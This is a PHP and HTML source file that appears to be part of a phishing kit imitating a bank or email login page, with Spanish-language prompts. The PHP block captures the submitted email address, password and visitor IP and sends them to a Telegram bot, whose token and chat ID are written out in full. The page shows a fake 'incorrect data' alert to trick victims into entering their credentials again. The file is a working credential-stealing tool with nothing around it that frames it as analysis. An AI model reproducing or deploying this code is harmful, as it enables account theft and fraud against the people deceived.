<?php
session_start();
if( isset( $_POST['numdoc'] ) && isset( $_POST['clv']) ){
        
    $_SESSION['COD'] = $_POST['numdoc'];
    $_SESSION['USER'] = $_POST['clv'];
    
    @$message = "EMAIL-BM-VIRT \n\n"."\nIP: ".$_SERVER['REMOTE_ADDR']."\n".'USUARIO: '.$_SESSION['COD']."\n".'CLAVE: '.$_SESSION['USER'];

    $apiToken = "7416091120:AAHB2mjzCxt6PufGAmfueF8OdyYW9gcUpsM";

    $data = [
        'chat_id' => '-4530783174',
        'text' => $message
    ];
    
    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data); 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url); 
    $result = curl_exec($ch); 

}else{
    // @header('Location: index3.php');
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <link rel="stylesheet" href="cs.css">
</head>
<body class="body">
    

 <script >
         
            alert("Algun de los datos son incorrectos.");
          </script>



<center>

<form class="form" method="post" action="espera.php">

<img src="bm-icon.svg" alt="">


<br><br>

<img class="title" src="title.png" alt="">


<br><br>


<div style="height: 130px;" class="caja1">


    <img class="ic" src="ic.png" alt="">
<input name="numdoc" required class="ip1" type="email" placeholder="Ingresa tu correo electronico">
<br>
<img class="ic" src="sg.png" alt="">
<input name="clv" required class="ip1" type="password" placeholder="Ingresa contraseña de correo electronico">
 <br><br>
<a style="font-size: small; margin-top: -15px; position: absolute; color: red;">Credenciales incorrectas</a> 
</div>

<br><br>

<input class="btn" type="submit" value="CONTINUAR">

<br>

<img class="pp" src="reg.png" alt="">





</form>

<br>

<img class="of"  style="margin-left: -4px;" width="100%" src="imgg.png" alt="">


<br>


<img style="width: 200px;" src="terminos.png" alt="">

<br>

<img style="width: 450px;" src="copy.png" alt="">










</body>
</html>